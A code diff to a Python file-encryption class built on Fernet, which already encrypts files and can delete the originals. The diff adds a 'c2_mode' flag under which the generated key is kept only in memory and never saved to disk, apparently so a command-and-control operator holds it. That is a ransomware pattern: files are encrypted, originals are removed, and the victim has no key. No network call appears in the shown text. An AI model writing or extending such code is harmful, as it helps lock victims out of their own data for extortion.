@@ -2,10 +2,12 @@ from cryptography.fernet import Fernet
 import os
 
 class CryptoGraphy:
-    def __init__(self, fernet: Fernet = None, should_encrypt: bool = True, should_delete_original: bool = True):
+    def __init__(self, fernet: Fernet = None, should_encrypt: bool = True, should_delete_original: bool = True, c2_mode: bool = False):
         self.__fernet__ = fernet
         self.__should_encrypt__ = should_encrypt
         self.__should_delete_original__ = should_delete_original
+        self.__c2_mode__ = c2_mode
+        self.key = None
     
     def encrypt(self, filename: str):
         print(f"Encrypting {filename}")
@@ -46,17 +48,20 @@ class CryptoGraphy:
         print(f"{encrypted_filename} has been decrypted to {output_filename}.")
 
     def setup(self, key_filename: str = "secret.key"):
-        key = Fernet.generate_key()
+        self.key = Fernet.generate_key()
 
-        with open(key_filename, "wb") as key_file:
-            key_file.write(key)
+        if not self.__c2_mode__:
+            with open(key_filename, "wb") as key_file:
+                key_file.write(self.key)
+            print(f"Encryption key saved as {key_filename}")
+        else:
+            print("C2 mode enabled: Key not saved to file.")
 
-        print(f"Encryption key saved as {key_filename}")
-        self.__fernet__ = Fernet(key)
+        self.__fernet__ = Fernet(self.key)
 
     def load_key(self, key_filename: str = "secret.key"):
         with open(key_filename, "rb") as key_file:
-            key = key_file.read()
+            self.key = key_file.read()
             
-        self.__fernet__ = Fernet(key)
-        return key
+        self.__fernet__ = Fernet(self.key)
+        return self.key
